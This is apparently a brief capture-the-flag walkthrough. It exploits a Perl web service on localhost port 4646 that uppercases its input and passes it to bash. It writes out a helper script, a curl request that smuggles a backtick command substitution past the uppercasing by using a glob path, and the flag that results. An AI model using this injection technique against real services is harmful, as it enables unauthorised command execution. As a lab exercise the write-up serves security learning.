HINT:
There is a bash command executed in the perl code, perhaps you could exploit that

ANSWER:
When reading the perl code we understand that there is a server running on localhost port 4646 it takes two arguments but only the first one is interesting to us as it gets executed in a bash command after being modified to uppcase and gotten white spaces removed.
However you can run capitalized commands in bash but we can write a script that will do that for us.
echo "getflag > /tmp/flag" > /tmp/LOL
We then curl the server with the following command:
curl localhost:4646/?x='`/*/LOL`'
We use a star as we can't write tmp because it will be capitalized and bash will match it with the tmp directory.
we then cat /tmp/flag and get:
g1qKMiRpXf53AWhDaU7FEkczr
